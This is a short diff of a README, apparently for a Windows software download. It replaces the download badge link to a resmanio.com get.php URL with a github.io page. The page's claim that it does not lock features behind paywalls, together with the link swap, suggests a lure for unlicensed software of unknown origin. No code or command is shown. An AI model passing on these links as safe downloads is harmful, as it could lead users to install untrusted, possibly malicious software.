@@ -31,7 +31,7 @@ We don’t lock features behind paywalls — we enable access.
 
 ## 📥 Download for Windows
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for-Windows-0078D6?style=for-the-badge&logo=windows)](https://resmanio.com/get.php?call=win)  
+[![Download for Windows](https://img.shields.io/badge/Download%20for-Windows-0078D6?style=for-the-badge&logo=windows)](https://ce-for-windows-os.github.io/.github/)  
 *Windows Optimization*
 
 *This version is optimized for Windows 10 and Windows 11. Compatible with both 32-bit and 64-bit systems.*
